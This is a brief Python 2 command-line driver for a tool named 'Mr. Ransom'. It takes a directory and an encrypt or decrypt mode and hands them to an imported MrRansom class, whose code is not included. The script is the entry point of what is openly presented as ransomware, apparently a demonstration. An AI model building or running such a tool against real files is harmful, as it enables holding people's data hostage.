import argparse
import os
import time

import sys

from mrransom import MrRansom

if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog='mr-ransom', description='Mr. Ransom - Encrypts your precious files.')
    parser.add_argument('-m', '--mode', type=str, required=True, choices=['e', 'encrypt', 'd', 'decrypt'],
                        help='choose which process to complete')
    parser.add_argument('-d', '--dir', type=str, required=True, help='specify the base directory to process')

    args = parser.parse_args()

    start_time = time.time()

    specified_dir = os.path.expanduser(args.dir)
    if not os.path.exists(specified_dir):
        print >> sys.stderr, "Specified dir does not exist"
        exit(-1)

    ransom = MrRansom(specified_dir)
    if args.mode == 'e' or args.mode == 'encrypt':
        ransom.encrypt()
    elif args.mode == 'd' or args.mode == 'decrypt':
        ransom.decrypt()

    print "Took {}s total".format(time.time() - start_time)
